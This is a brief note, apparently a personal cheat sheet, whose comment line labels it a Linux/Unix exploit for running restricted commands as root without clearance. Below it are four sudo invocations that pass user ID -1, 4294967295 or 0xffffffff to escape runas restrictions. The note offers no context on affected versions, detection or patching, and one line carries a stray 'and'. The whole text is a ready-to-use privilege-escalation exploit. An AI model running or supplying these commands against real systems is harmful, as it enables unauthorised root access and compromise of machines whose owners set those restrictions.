#Linux/Unix exploit allows some restricted commands to be run as root without clearance
sudo -u#-1 /bin/bash
sudo -u#-1 id -u and 
sudo -u#4294967295 id -u 
sudo -u \#$((0xffffffff))